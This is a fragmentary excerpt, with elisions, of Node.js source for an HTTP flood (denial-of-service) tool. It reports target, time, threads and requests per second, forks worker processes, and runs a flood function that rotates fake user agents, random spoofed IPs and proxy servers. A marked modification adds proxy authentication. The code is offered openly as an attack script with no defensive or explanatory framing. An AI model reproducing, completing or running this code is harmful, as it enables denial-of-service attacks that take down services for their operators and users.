...
// Helper functions to get random header values
function accept() {
...
if (cluster.isMaster) {
    console.log(`Target: ${target} | Time: ${time} | Threads: ${thread} | RPS: ${rps}`);
    ...
    function flood() {
        ...
        const uas = fakeua();
        var proxy = proxyr().split(':'); // Will be [host, port] or [host, port, user, pass]
        var randIp = randomIp();
        ...
        // Options for the initial CONNECT request to the proxy server
        const reqOptions = {
            host: proxy[0],
            port: proxy[1],
            agent: agent,
        ...
        // *** MODIFICATION FOR AUTHENTICATED PROXY ***
        // If the proxy array has 4 parts, it includes a username and password.
        if (proxy.length === 4) {
            const auth = 'Basic ' + Buffer.from(proxy[2] + ':' + proxy[3]).toString('base64');
            reqOptions.headers['Proxy-Authorization'] = auth;
        }
        // *** END MODIFICATION ***

        var req = http.request(reqOptions, function () {
